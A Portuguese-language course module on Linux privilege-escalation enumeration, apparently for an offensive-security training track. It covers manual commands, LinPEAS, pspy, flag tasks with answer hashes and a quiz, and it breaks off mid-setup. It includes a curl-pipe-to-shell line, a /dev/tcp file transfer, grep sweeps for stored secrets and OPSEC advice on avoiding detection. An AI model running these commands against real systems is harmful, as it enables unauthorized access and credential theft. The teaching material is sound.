@@ -1,0 +1,595 @@
+---
+slug: privesc-linux-enumeracao
+track: trilha-6
+title: "PrivEsc Linux: enumeração"
+prerequisites: [conceitos-de-privesc, linux-processos-e-pacotes]
+lab: null
+tasks:
+  - slug: missao-1-credencial-no-config
+    title: "Missão 1 — A credencial no arquivo de configuração"
+    type: flag
+    prompt: "A senha do banco que você recuperou do arquivo de configuração legível por todos, depois de decodificar o valor de db_password. É o conteúdo inteiro, já decodificado, no formato FLAG{...}."
+    hint: "O valor em db_password não é texto puro nem criptografia: é base64 (repare que termina em '=' ou tem cara de base64). Ache o arquivo com um grep recursivo por 'pass' e decodifique com base64 -d."
+    flag:
+      hash: "scrypt$16384$8$1$10b74e9b31eaddccc30afaaccfec7cccfd0dd30043453f31e85b612148b9043f"
+      salt: "99a5ca3e02a1fb72fcf41cfe526db33b"
+  - slug: missao-2-vetor-no-cruzamento
+    title: "Missão 2 — O vetor no cruzamento"
+    type: flag
+    prompt: "Monte FLAG{basename-usuario-octal}: o nome (só o basename) do único arquivo que é vetor real — gravável por qualquer um E executado por uma tarefa agendada —, o usuário que o cron usa para executá-lo, e o modo em octal que o torna gravável por todos. Formato: FLAG{nome.sh-usuario-NNN}, com o octal de três dígitos."
+    hint: "Cruze a lista de arquivos world-writable (find ... -perm -o+w -type f) com o cron (os arquivos em etc/cron.d). Há três candidatos que parecem promissores; só um está nas duas listas ao mesmo tempo. rwxrwxrwx em octal é 7-7-7."
+    flag:
+      hash: "scrypt$16384$8$1$782b6eb69bf92181cd23516c719152302d0f3721d0fe4439aa79e0bca2ca58fc"
+      salt: "ef83e5b3cfe7f0e98b49590351bd96a1"
+  - slug: missao-3-pspy-cron-oculto
+    title: "Missão 3 — O processo que o crontab esconde"
+    type: flag
+    prompt: "Monte FLAG{pspy-cron-oculto-TOKEN}: o valor que vem depois de --token na linha de comando que só o pspy revelou (o crontab -l do seu usuário não mostra esse job). Formato: FLAG{pspy-cron-oculto-xxxxxx}."
+    hint: "Rode o pspy e deixe uns 20 segundos. Olhe as linhas que começam com CMD: — o job roda de poucos em poucos segundos e carrega o token como argumento do healthcheck.sh."
+    flag:
+      hash: "scrypt$16384$8$1$1e50a3e2f7209319e70845ccdcf957deb65e1f3a985c8075bbce3ec1b982f7ed"
+      salt: "880a86740e5c3d0e1a9c7bdc10f8077f"
+  - slug: quiz-final
+    title: "Quiz — PrivEsc Linux: enumeração"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Por que um usuário sem privilégio nenhum consegue, mesmo assim, enumerar tanta coisa de um sistema Linux (SUID, cron, versão do kernel, parte dos processos)?"
+        options:
+          - "Porque todo usuário no Linux é, na prática, um administrador disfarçado"
+          - "Porque muita informação do sistema é legível por padrão (binários e configs world-readable, /etc/passwd, /proc) — ler é barato, e o sistema precisa que programas comuns leiam essas coisas para funcionar; esconder tudo quebraria o funcionamento normal"
+          - "Porque o kernel desliga as permissões quando não há root logado"
+          - "Porque a enumeração explora uma falha de segurança para ver esses dados"
+        answer: 1
+        explanation: "A enumeração não explora falha nenhuma: ela lê o que já é legível. O modelo do Linux torna legível por padrão quase tudo que não é segredo (a lista de binários, as configs, a versão do kernel em /proc/version, os metadados dos processos em /proc). Isso é necessário para o sistema operar, mas entrega ao atacante o mapa do terreno de graça. Por isso enumerar vem antes de explorar."
+      - question: "Você roda `find / -perm -4000 -type f` e esquece o `2>/dev/null`. O que acontece e por quê?"
+        options:
+          - "O comando não encontra nenhum SUID, porque sem 2>/dev/null o find é bloqueado"
+          - "A saída se enche de linhas 'Permission denied' das pastas que você não pode ler, afogando os poucos resultados úteis; o 2>/dev/null joga esses erros (stderr) fora e deixa só os achados (stdout)"
+          - "O comando passa a rodar como root"
+          - "Nada muda: 2>/dev/null é decorativo"
+        answer: 1
+        explanation: "Como você é um usuário comum, o find esbarra em dezenas de diretórios sem permissão de leitura e imprime um 'Permission denied' para cada um — tudo em stderr. Sem o 2>/dev/null, esse ruído enterra os resultados reais (que saem em stdout). Redirecionar stderr para /dev/null é o que torna a saída legível. É um dos erros mais comuns de quem está começando."
+      - question: "No LinPEAS, um achado aparece marcado em RED/YELLOW. Segundo a legenda que o próprio LinPEAS imprime, o que isso significa — e o que você deve fazer?"
+        options:
+          - "Que é 100% garantido virar root; pode rodar o exploit sem pensar"
+          - "Que é, pela legenda, um vetor de escalação com ~95% de chance; é o que você olha primeiro, mas ainda confirma à mão antes de agir"
+          - "Que é uma configuração segura (good), pode ignorar"
+          - "Que o LinPEAS encontrou um antivírus"
+        answer: 1
+        explanation: "A legenda do LinPEAS diz literalmente 'RED/YELLOW: 95% a PE vector' — ou seja, altíssima prioridade, o primeiro lugar onde olhar. Mas 95% não é 100%: o profissional confirma o achado manualmente (o arquivo é mesmo gravável? o cron roda mesmo como root?) antes de queimar o vetor. Verde é 'bom pelo nome', não garantia; e nada ali desliga antivírus."
+      - question: "O `crontab -l` do seu usuário não mostra nada, mas você desconfia que há um job periódico rodando como root. Qual ferramenta/abordagem revela isso sem você ter privilégio, e como?"
+        options:
+          - "sudo crontab -l, que sempre funciona sem senha"
+          - "O pspy: ele vigia /proc e usa o inotify para ser avisado de atividade no sistema de arquivos, listando os processos que nascem (UID, PID e linha de comando) — inclusive os jobs de outros usuários — sem precisar de root"
+          - "O comando ps uma única vez, que mostra todo o histórico de processos"
+          - "Não há como: se não está no seu crontab, é invisível"
+        answer: 1
+        explanation: "O crontab de root fica em arquivos que você não lê, então crontab -l (que mostra só o SEU) não ajuda e sudo exigiria senha. O pspy resolve observando o sistema de fora: via inotify ele é avisado quando algo mexe no filesystem e então varre /proc, capturando processos curtos que um ps pontual perderia — incluindo o comando exato que o cron de root executa. É a ferramenta clássica para 'ver' o cron invisível."
+      - question: "A enumeração manual e o LinPEAS encontram, numa mesma máquina: (a) um binário SUID padrão (/usr/bin/passwd), (b) um arquivo /opt/app/run.sh gravável por todos que um cron de root executa a cada minuto, e (c) o kernel 5.4 (com um exploit público conhecido). Qual você tenta primeiro e por quê?"
+        options:
+          - "O (a), porque SUID é sempre o caminho mais fácil"
+          - "O (c), o kernel exploit, porque é o mais poderoso"
+          - "O (b), o cron + script gravável, porque é o mais confiável e o mais silencioso: você reescreve o script e espera o root rodá-lo, sem risco de derrubar a máquina"
+          - "Tanto faz, os três são equivalentes"
+        answer: 2
+        explanation: "Prioriza-se por confiabilidade, ruído e estabilidade. O (a) é padrão, não é vetor. O (c) funciona, mas um kernel exploit pode travar a máquina e acende alarmes — é o martelo, guardado para o fim. O (b) é o bisturi: um script que VOCÊ controla e que o root executa sozinho é quase garantido, silencioso e estável. É a mesma lição do 6.1: o vetor real vive no cruzamento entre o que você controla e o que tem poder."
+      - question: "Por que, num alvo real monitorado, muitos profissionais preferem a enumeração manual (ou o pspy) a jogar o LinPEAS inteiro na máquina?"
+        options:
+          - "Porque o LinPEAS não funciona em servidores de verdade"
+          - "Porque o LinPEAS é um script enorme e barulhento: ele executa centenas de comandos e lê um monte de arquivos num curto intervalo, um padrão que ferramentas de detecção (auditd, EDR) reconhecem facilmente; a enumeração manual seletiva e o pspy fazem muito menos barulho"
+          - "Porque a enumeração manual é sempre mais completa que o LinPEAS"
+          - "Porque o LinPEAS precisa de root para rodar"
+        answer: 1
+        explanation: "LinPEAS é ótimo para velocidade e cobertura, mas é tudo menos discreto: a enxurrada de execuções e leituras que ele dispara é um sinal claro para quem monitora. Em um engajamento onde não ser pego importa (OPSEC), o profissional enumera à mão só o que precisa, ou usa o pspy (que é passivo). Não é que o LinPEAS seja pior — é que cada ferramenta tem um custo de ruído, e escolher é parte do ofício."
+      - question: "O grupo TeamTNT, num ataque real a servidores Linux na nuvem, vasculhava ~/.aws/credentials, /proc/*/environ e o metadata service em 169.254.169.254. Em qual das quatro classes de escalação isso se encaixa, e qual a lição de defesa?"
+        options:
+          - "Software vulnerável; a lição é atualizar o kernel"
+          - "Credenciais; a lição é não deixar segredos legíveis em arquivos, variáveis de ambiente e endpoints de metadados — e tratar a enumeração de credenciais como uma ameaça real, porque é automatizada e rápida"
+          - "Abuso de recurso legítimo; a lição é desligar o cron"
+          - "Má configuração; a lição é fechar a porta 80"
+        answer: 1
+        explanation: "TeamTNT fazia enumeração de credenciais (classe 3): procurava chaves e senhas onde elas costumam vazar — arquivos de config, variáveis de ambiente de processos (/proc/*/environ) e o serviço de metadados da nuvem. A defesa é não deixar o segredo legível em primeiro lugar (cofres, IMDSv2, permissões restritas) e monitorar acessos em massa a esses caminhos. Mostra que a enumeração não é teoria: é a primeira coisa que um worm automatizado faz."
+glossary:
+  - term: PEASS-ng
+    definition: "Privilege Escalation Awesome Scripts Suite (next generation): o projeto de código aberto que reúne os enumeradores de escalação de privilégio mais usados, o LinPEAS (Linux) e o WinPEAS (Windows). É a caixa de ferramentas padrão para a fase de enumeração."
+  - term: LinPEAS
+    definition: "Linux Privilege Escalation Awesome Script: um script que automatiza a enumeração de escalação no Linux, varrendo dezenas de superfícies e colorindo os achados por prioridade (RED/YELLOW = ~95% um vetor, pela própria legenda da ferramenta). Faz em segundos o que levaria muito tempo à mão — ao custo de ser barulhento."
+  - term: pspy
+    definition: "Uma ferramenta que mostra os processos que nascem no sistema — inclusive os jobs de cron de outros usuários — sem precisar de root, usando o inotify para ser avisado de atividade e varrendo o /proc a cada aviso. É como se enxerga o cron de root que o crontab -l não revela."
+  - term: linux-exploit-suggester
+    definition: "Um script que compara a versão do kernel (e a distribuição) com uma base de exploits locais públicos conhecidos e sugere quais podem funcionar. Dá a lista de candidatos de kernel exploit; não confirma nada, e por isso o resultado sempre precisa ser validado antes de usar."
+  - term: world-writable
+    definition: "Um arquivo ou diretório gravável por qualquer usuário do sistema (o bit de escrita ligado para 'outros', o terceiro grupo de permissões — por exemplo rwxrwxrwx / 777). Quando algo world-writable é executado por uma conta privilegiada, vira um vetor de escalação direto."
+---
+
+import funilDaEnumeracao from "./img/funil-da-enumeracao.svg";
+import transferenciaOffline from "./img/transferencia-offline.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No 6.1 você ganhou o mapa: sabe que a escalação mora em uma de quatro classes (má configuração, software vulnerável, credenciais, abuso de recurso legítimo) e que o vetor real vive no cruzamento entre *o que você controla* e *o que tem poder*. Mas um mapa não anda sozinho. Quando você cai num <GlossaryTerm term="foothold">foothold</GlossaryTerm> (o acesso inicial, de onde se executa comando no alvo) como uma conta de baixo privilégio — o `daemon` do 5.6, um `www-data` qualquer —, está diante de uma máquina muda. Tudo que você sabe sobre ela precisa ser **arrancado**, comando a comando. Essa é a <GlossaryTerm term="enumeration">enumeration</GlossaryTerm> (enumeração): o levantamento sistemático de tudo que o sistema revela, para transformar uma tela preta num mapa de vetores.
+
+Enumerar é, de longe, a parte que mais separa quem escala de quem desiste. Exploradores de verdade não "tentam exploits": eles enumeram bem, e o vetor aparece. Um relatório de pentest ruim quase sempre tem a mesma causa — enumeração preguiçosa, que parou no primeiro `sudo -l` sem nada e concluiu "não dá para escalar". Este módulo ensina a não ser essa pessoa: o arsenal manual, as ferramentas (<GlossaryTerm term="LinPEAS">LinPEAS</GlossaryTerm> e <GlossaryTerm term="pspy">pspy</GlossaryTerm>), como ler a montanha de saída sem se afogar, e como levar as ferramentas para um alvo que não tem internet.
+
+**Ao final, você vai saber:**
+
+- enumerar à mão, de forma completa, as superfícies de escalação de um host Linux (contexto, SUID/SGID, `sudo`, capabilities, cron/timers, arquivos graváveis, credenciais, kernel, rede);
+- rodar e **ler** o LinPEAS, entendendo a legenda de cores e por que `RED/YELLOW` é por onde se começa;
+- usar o pspy para ver processos e jobs de cron de outros usuários **sem** ter privilégio;
+- transferir as ferramentas para um alvo sem acesso à internet (via Kali, `curl`/`wget` e o `/dev/tcp` do `bash`), e rodá-las da memória;
+- triar a saída pelas quatro classes do 6.1 e priorizar os candidatos por confiabilidade, ruído e estabilidade.
+
+**Pré-requisitos:** **6.1 — Conceitos de privilégio** (as quatro classes, as superfícies de Linux e a pergunta-guia "o que eu controlo e que algo mais privilegiado usa?", que aqui vira método); **0.4 — Linux: processos, pacotes e edição** (`ps`, <GlossaryTerm term="cron">cron</GlossaryTerm>, `find`, `grep` e a leitura das permissões do `ls -l`, que você vai usar o tempo todo).
+
+**Tempo estimado:** 3 a 4 horas, incluindo as três missões no seu WSL.
+
+<Callout variant="ethics">
+Enumerar um sistema para escalar privilégio só é legítimo na sua própria máquina, no laboratório local ou em um alvo com autorização por escrito. As missões deste módulo rodam no **seu** WSL, contra um cenário de treino que **você** gera — nada de mirar máquina de terceiros. Rodar o LinPEAS ou o pspy num servidor sem autorização já é acesso não autorizado, crime pela lei 12.737/2012 (veja o 1.4).
+</Callout>
+
+## 2. Teoria aprofundada — por que a enumeração funciona
+
+### 2.1 Ler é barato: por que a máquina entrega tanto
+
+A primeira pergunta é quase filosófica: por que um usuário *sem poder nenhum* consegue descobrir tanta coisa? A resposta está no desenho do Linux. Para funcionar, o sistema precisa que programas comuns leiam um monte de coisa: o `ls` lê os diretórios, o shell lê o `/etc/passwd` para traduzir um <GlossaryTerm term="UID">UID</GlossaryTerm> num nome, o `apt` lê a lista de pacotes. Então **a leitura é aberta por padrão** — binários, bibliotecas e a maioria das configurações são legíveis por todo mundo (*world-readable*). Esconder tudo seria tão caro que quebraria o uso normal da máquina.
+
+O resultado é uma assimetria que favorece o atacante: **esconder informação é caro; lê-la é de graça.** A lista de binários `SUID`, a versão exata do kernel, quem roda o quê pelo cron, quais portas estão abertas, qual serviço está em qual conta — nada disso é segredo, e tudo isso é exatamente o que você precisa para achar o degrau. A enumeração não *explora* falha nenhuma: ela só lê, com método, o que a máquina já conta para quem perguntar.
+
+Por isso a enumeração vem **antes** de qualquer exploração, e por isso ela é tão decisiva. O diagrama abaixo é o método deste módulo inteiro: um funil que começa largo (colete tudo) e termina estreito (um punhado de candidatos priorizados), pronto para o 6.3 explorar.
+
+<Figure
+  src={funilDaEnumeracao}
+  alt="Funil vertical de quatro estágios. No topo, o foothold: conta de baixo privilégio como www-data ou daemon. Estágio 1 (mais largo), COLETAR tudo: contexto (id, uname, os-release), SUID/SGID, sudo, capabilities, cron e timers, arquivos graváveis, credenciais, kernel e rede — à mão e com LinPEAS e pspy. Estágio 2, LER e reduzir o ruído com 2>/dev/null e lendo cada bloco. Estágio 3, TRIAR pelas quatro classes: má configuração, software vulnerável, credenciais, abuso de recurso legítimo. Estágio 4 (mais estreito), CANDIDATOS priorizados por confiabilidade, ruído e estabilidade. Uma seta sai para a caixa final: módulo 6.3, explorar o vetor."
+  caption="O método do módulo: colete tudo, reduza o ruído, trie pelas quatro classes e termine com poucos candidatos priorizados. O 6.3 pega esse funil pronto e explora."
+/>
+
+### 2.2 O que o `/proc` entrega sem root
+
+Uma peça merece destaque: o <GlossaryTerm term="procfs">procfs</GlossaryTerm> (o sistema de arquivos virtual montado em `/proc`), que o kernel popula em tempo real com o estado da máquina. Ele não ocupa disco — cada "arquivo" ali é uma janela para dentro do kernel. E boa parte dele é legível por um usuário comum:
+
+- `/proc/version` — a versão exata do kernel, a primeira coisa que decide se um <GlossaryTerm term="kernel exploit">kernel exploit</GlossaryTerm> é viável;
+- `/proc/<PID>/cmdline` — a linha de comando de um processo, inclusive de outros usuários (é assim que o `ps` funciona). Se um script roda com uma senha no argumento, ela aparece aqui;
+- `/proc/<PID>/environ` — as variáveis de ambiente de um processo. Se você consegue ler o de um processo privilegiado, pode achar uma credencial. Foi exatamente aqui que o worm TeamTNT (seção 4) caçava chaves da AWS.
+
+O `/proc` é, portanto, uma mina de enumeração que não exige nenhum privilégio especial — só saber onde olhar. Ferramentas como o pspy nada mais fazem do que ler o `/proc` de forma esperta e contínua.
+
+### 2.3 Manual contra automatizado: confiabilidade, cobertura e ruído
+
+Há duas formas de enumerar, e a diferença entre elas é um tema que vai te seguir por toda a carreira ofensiva.
+
+A **enumeração automatizada** — o LinPEAS à frente — roda centenas de verificações em segundos e colore o que importa. É imbatível em cobertura e velocidade: ele não esquece de olhar os timers do systemd nem as capabilities, coisas que a pressa faz um humano pular. O preço é o **ruído**: jogar o LinPEAS numa máquina dispara uma avalanche de execuções e leituras de arquivo num intervalo curtíssimo — um padrão que qualquer ferramenta de detecção séria (o `auditd`, ou um EDR — *endpoint detection and response*, as plataformas que vigiam cada máquina em busca de comportamento suspeito) reconhece na hora. Num exercício de laboratório, tanto faz. Num engajamento onde não ser pego é parte do escopo, esse barulho pode queimar a operação.
+
+A **enumeração manual** é o oposto: seletiva, lenta, silenciosa. Você roda só o comando de que precisa, lê, pensa, roda o próximo. É mais fácil esquecer uma superfície, mas é o que se faz quando o <GlossaryTerm term="OPSEC">OPSEC</GlossaryTerm> (a disciplina de não deixar rastro) importa — e é também a única forma de *entender* o que está vendo, em vez de depender da cor que um script pintou. O pspy fica no meio: é uma ferramenta, mas **passiva** — só observa, não executa centenas de comandos, então faz pouco barulho.
+
+A conclusão madura não é "manual é melhor" nem "ferramenta é melhor": é saber o custo de cada uma e escolher. Neste módulo você aprende as duas, começando pela manual — porque quem só sabe rodar o LinPEAS e olhar o vermelho não sabe escalar; sabe rodar o LinPEAS.
+
+### 2.4 Antes de tudo: um shell que dá para trabalhar
+
+Um detalhe que trava todo iniciante. O shell que você ganha num foothold (de um <GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm>, por exemplo) costuma ser **não-interativo**: sem `Ctrl-C` sem matar a sessão, sem `Tab` para completar, sem histórico, e muitos programas (como o `sudo` ou editores) simplesmente recusam rodar. Tentar enumerar assim é sofrimento. Por isso o primeiro passo, antes de qualquer `find`, costuma ser **estabilizar o shell** — promovê-lo a um <GlossaryTerm term="TTY">TTY</GlossaryTerm> de verdade (o dispositivo de terminal que o sistema espera). O truque clássico, quando há Python no alvo:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Isso já dá um shell bem mais utilizável. (Há refinamentos — ajustar `stty`, exportar `TERM` — que você vê no 6.3, quando for explorar de verdade.) Guarde a ordem: **estabilize, depois enumere.**
+
+## 3. Como funciona — o arsenal da enumeração
+
+Vamos ao concreto. Esta seção é o seu arsenal: os comandos manuais, bloco a bloco, e depois as ferramentas. Todas as saídas aqui são reais, capturadas enquanto este módulo era escrito, com os nomes de máquina e IPs trocados por exemplos genéricos. Imagine que você acabou de cair num host `web-01` (`192.168.0.10`) como `www-data`.
+
+### 3.1 Contexto: quem sou eu e onde estou
+
+```console
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ hostname; cat /etc/os-release | head -2
+web-01
+PRETTY_NAME="Ubuntu 22.04.4 LTS"
+NAME="Ubuntu"
+$ uname -a; cat /proc/version
+Linux web-01 5.15.0-101-generic #111-Ubuntu SMP ... x86_64 GNU/Linux
+Linux version 5.15.0-101-generic (buildd@...) (gcc ...) #111-Ubuntu SMP ...
+```
+
+Três perguntas respondidas: **quem** você é (uid 33, `www-data`, sem grupos interessantes — se aparecesse `sudo`, `docker` ou `lxd`, seria ouro), **que distribuição** é (decide onde procurar configs) e **qual kernel** (`5.15.0-101`, que o `linux-exploit-suggester` da seção 3.5 vai cruzar com a base de exploits).
+
+### 3.2 As superfícies clássicas, uma a uma
+
+```console
+$ sudo -l
+Matching Defaults entries for www-data on web-01:
+    env_reset, mail_badpass, secure_path=/usr/sbin:/usr/bin:/sbin:/bin
+User www-data may run the following commands on web-01:
+    (root) NOPASSWD: /usr/bin/id
+$ find / -perm -4000 -type f 2>/dev/null
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chsh
+$ getcap -r / 2>/dev/null
+/usr/bin/ping cap_net_raw=ep
+```
+
+Note o `2>/dev/null` em todo comando que varre o disco: como `www-data`, o `find` esbarra em centenas de pastas sem leitura e cuspiria um `Permission denied` para cada uma — o `2>/dev/null` joga esse ruído (o <GlossaryTerm term="stderr">stderr</GlossaryTerm>) fora e deixa só os achados. O `-perm -4000` pede os arquivos com o bit <GlossaryTerm term="SUID">SUID</GlossaryTerm> ligado (`-2000` pediria o <GlossaryTerm term="SGID">SGID</GlossaryTerm>); o `getcap -r` lista as <GlossaryTerm term="Linux capabilities">Linux capabilities</GlossaryTerm>. Aqui tudo é padrão — mas é assim que se descobre o `find`, o `python` ou o `vim` fora do lugar que o <GlossaryTerm term="GTFOBins">GTFOBins</GlossaryTerm> transforma em root (no 6.3).
+
+```console
+$ cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null
+$ systemctl list-timers --all 2>/dev/null | head
+$ find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)' | head
+```
+
+Tarefas agendadas (via `/etc/crontab`, `/etc/cron.d/*` e os timers do `systemd`) e arquivos graváveis são as duas listas que você vai **cruzar** — porque, como o 6.1 ensinou, o vetor mora onde elas se tocam: um arquivo que *você* edita e que o *root* executa.
+
+```console
+$ grep -RiE 'password|secret|api[_-]?key' /etc /var/www 2>/dev/null | head
+$ cat ~/.bash_history 2>/dev/null; env
+$ ss -tlnp 2>/dev/null
+```
+
+Credenciais vazam em arquivos de config, no histórico de comandos e nas variáveis de ambiente (`env`). O `ss -tlnp` mostra portas abertas **só no loopback** — serviços internos que, da rede, você não veria, e que às vezes são o próximo pulo.
+
+### 3.3 LinPEAS: a enumeração automatizada
+
+Fazer tudo isso à mão, sem esquecer nada, é trabalhoso. O <GlossaryTerm term="LinPEAS">LinPEAS</GlossaryTerm> — parte do projeto <GlossaryTerm term="PEASS-ng">PEASS-ng</GlossaryTerm> (Privilege Escalation Awesome Scripts Suite, next generation) — faz a varredura inteira em segundos e colore o resultado. A legenda que ele mesmo imprime no começo é a chave para ler a saída:
+
+```text
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look at it
+  LightCyan: Users with console
+  Green: Common things (users, groups, SUID, capabilities...)
+```
+
+Ou seja: **`RED/YELLOW` é por onde você começa** — a própria ferramenta aponta ~95% de chance de ser um vetor. Mas 95% não é 100%: você confirma o achado à mão antes de agir (o arquivo é mesmo gravável? o cron roda mesmo como root?). O verde é "coisa comum, pelo nome" — contexto, não vetor. Rodar é simples:
+
+```console
+$ ./linpeas.sh | tee /tmp/linpeas.txt
+...
+╔══════════╣ Interesting GROUP writable files (not in Home)
+╚ https://.../privilege-escalation#writable-files
+/opt/scripts/backup.sh (Unknown)
+...
+```
+
+O `tee` guarda a saída num arquivo para você reler com calma (o terminal rola rápido demais). A regra de ouro: **não olhe só o vermelho.** Metade dos vetores reais está no cruzamento de duas seções — um arquivo gravável numa, um cron noutra — e nenhuma cor liga as duas por você.
+
+### 3.4 pspy: enxergar o cron invisível
+
+O `crontab -l` mostra só o *seu* crontab. O cron do root fica em arquivos que você não lê — então, do seu foothold, os jobs de root são invisíveis. É aí que entra o <GlossaryTerm term="pspy">pspy</GlossaryTerm>: ele vigia o `/proc` continuamente (usando o `inotify` do kernel para ser avisado quando algo mexe no sistema de arquivos) e lista **todo** processo que nasce — UID, PID e a linha de comando completa —, inclusive os jobs que o cron de root dispara. Sem precisar de root.
+
+```console
+$ ./pspy64
+2026/01/10 14:12:04 CMD: UID=0  PID=4123 | /bin/sh -c /opt/scripts/backup.sh
+2026/01/10 14:13:04 CMD: UID=0  PID=4190 | /bin/sh -c /opt/scripts/backup.sh
+```
+
+Deixe rodando um ou dois minutos e o padrão aparece: um comando que roda como `UID=0` (root) a cada minuto. Você acabou de descobrir, sem privilégio, uma tarefa de root — e, de quebra, o caminho exato do script que ela executa. É uma das ferramentas mais queridas em escalação, justamente porque revela o que o sistema tentou esconder.
+
+### 3.5 Kernel: o `linux-exploit-suggester`
+
+Quando nenhuma configuração abre caminho, sobra o kernel. O <GlossaryTerm term="linux-exploit-suggester">linux-exploit-suggester</GlossaryTerm> pega a versão que você viu em `/proc/version` e a cruza com uma base de exploits locais públicos, listando candidatos:
+
+```console
+$ ./linux-exploit-suggester.sh
+[+] [CVE-2022-2588] DirtyCred
+   Exposure: probable
+   ...
+```
+
+Trate o resultado como **pista**, não como verdade: ele diz "probable", não "funciona". Kernel exploit é o martelo (6.1) — poderoso, arriscado, barulhento. Confirme a versão, leia o exploit, e guarde-o para quando o bisturi (uma má configuração) não existir.
+
+### 3.6 Levar a ferramenta ao alvo sem internet
+
+Há um detalhe prático que a maioria dos tutoriais ignora: o alvo normalmente **não tem internet** (a rede do nosso lab, por regra, não acessa a internet — e um servidor de produção bem configurado também não sai para fora). Então você não "baixa o LinPEAS no alvo": você o serve da sua Kali e o puxa de lá.
+
+<Figure
+  src={transferenciaOffline}
+  alt="Três blocos ligados por setas. À esquerda, a Kali serve linpeas.sh por HTTP com python3 -m http.server 8000. No meio, a rede do lab, marcada como sem internet: o alvo só enxerga a Kali, não baixa nada de fora. À direita, o alvo com foothold de baixo privilégio puxa o arquivo com curl ou wget, ou, se não houver nenhum dos dois, com o recurso embutido do bash exec 3<>/dev/tcp/KALI/8000. Uma seta de volta mostra a execução direto da memória com curl cano sh, sem gravar em disco."
+  caption="O alvo não acessa a internet: você serve a ferramenta da Kali e a puxa pela rede interna — com curl/wget ou, na falta deles, com o /dev/tcp do bash. E pode rodá-la da memória, sem tocar o disco."
+/>
+
+Na sua Kali, dentro da pasta onde estão o `linpeas.sh` e o `pspy64`:
+
+```console
+$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+
+No alvo, puxe e rode. Se houver `curl` ou `wget`, é direto — e você pode até **pular o disco**, rodando da memória (deixa menos rastro):
+
+```console
+$ curl http://192.168.0.5:8000/linpeas.sh | sh
+```
+
+E se o alvo não tiver `curl` nem `wget` (acontece — lembra que o contêiner do DVWA não tinha quase nada)? O próprio `bash` fala TCP, via o pseudo-arquivo `/dev/tcp`:
+
+```bash
+exec 3<>/dev/tcp/192.168.0.5/8000
+echo -e "GET /linpeas.sh HTTP/1.0\r\nHost: x\r\n\r" >&3
+cat <&3 > /tmp/linpeas.sh
+```
+
+Esse é um exemplo de <GlossaryTerm term="living off the land">living off the land</GlossaryTerm>: usar só o que já existe no alvo, sem instalar nada. Guarde o `/dev/tcp` do `bash` — ele resolve muita transferência quando "não tem nenhuma ferramenta".
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### PwnKit — o SUID que a enumeração passou a gritar (CVE-2021-4034, 2022)
+
+Em **25 de janeiro de 2022**, a Qualys divulgou a **CVE-2021-4034**, apelidada **PwnKit**: uma falha de corrupção de memória no `pkexec`, um programa **SUID root** do pacote `polkit` presente por padrão em praticamente toda distribuição Linux. Explorá-la dava root local a **qualquer usuário sem privilégio**, de forma — nas palavras do aviso — "instantânea, confiável, e independente de arquitetura". O detalhe que a tornou lendária: o `pkexec` era vulnerável **desde a sua criação, em maio de 2009** — mais de doze anos de exposição. A nota recebeu CVSS **7.8 (High)** (vetor `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`), publicada no NVD em 28 de janeiro de 2022.
+
+O que isso tem a ver com *enumeração*? Tudo. O `pkexec` sempre esteve naquela lista de `find / -perm -4000` — era só mais um SUID "comum", verde no LinPEAS. A partir de 25/01/2022, aquela mesma linha virou um vetor confiável de root. A lição é profunda: **a enumeração não muda, mas o que ela significa muda com o tempo.** O bom enumerador não decora "SUID perigosos"; ele coleta todos e cruza com o que o mundo descobriu hoje.
+
+- **Impacto:** <GlossaryTerm term="local privilege escalation">escalação local</GlossaryTerm> para root em quase todo o parque Linux instalado; a correção era atualizar o pacote `polkit`.
+- **Lição:** colete tudo, até o que parece inócuo. O SUID "chato" de ontem é o root de amanhã.
+- **Fonte:** [Qualys Security Advisory — PwnKit (CVE-2021-4034)](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) e [registro no NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4034).
+
+### TeamTNT — a enumeração de credenciais como arma automatizada (2019–)
+
+A enumeração não é só coisa de pentester paciente: ela é a primeira coisa que um worm automatizado faz. O grupo **TeamTNT** (catalogado pelo MITRE ATT&CK como **G0139**, ativo desde outubro de 2019) ficou conhecido, segundo a Cado Security que o documentou em agosto de 2020, como o **primeiro worm de cryptojacking a roubar credenciais da AWS**. Ao cair num host Linux de nuvem, ele enumerava credenciais exatamente nos lugares onde elas vazam: os arquivos `~/.aws/credentials` e `~/.aws/config`, as variáveis de ambiente de processos em `/proc/*/environ`, chaves SSH soltas, e o serviço de metadados da instância em `http://169.254.169.254/`. Também limpava o histórico (`history -c`) para apagar o rastro.
+
+- **Impacto:** roubo em massa de credenciais de nuvem de milhares de hosts mal configurados, usadas para minerar criptomoeda e se espalhar — <GlossaryTerm term="cryptojacking">cryptojacking</GlossaryTerm> em escala.
+- **Lição:** a enumeração de credenciais (classe 3 do 6.1) é rápida, automatizável e implacável. A defesa é não deixar o segredo legível em primeiro lugar — e o conjunto de caminhos que o TeamTNT varria é, convenientemente, a sua própria checklist de onde procurar (e de onde um defensor deve tirar segredos).
+- **Fonte:** [MITRE ATT&CK — TeamTNT (G0139)](https://attack.mitre.org/groups/G0139/).
+
+## 5. Mãos à obra — enumerar de verdade
+
+Este módulo não tem lab próprio: você vai treinar no **seu próprio WSL**, contra um cenário que você mesmo gera. As ferramentas (LinPEAS e pspy) você roda de verdade, porque enumerar é uma habilidade de dedo — não se aprende lendo.
+
+**Objetivo:** ao terminar, você terá (1) recuperado uma credencial escondida num arquivo de configuração, enumerando à mão; (2) achado, por cruzamento, o único vetor real no meio de chamarizes; e (3) usado o pspy para ver um job periódico que o `crontab -l` esconde. Três flags, uma por missão.
+
+### 5.1 Preparar o terreno (passo a passo)
+
+Abra o terminal do Ubuntu (WSL). Primeiro, pegue as ferramentas (precisa de internet **na sua máquina** — isto é o papel da "Kali" do cenário; o "alvo" é a pasta de treino, que não sai para a rede):
+
+```bash
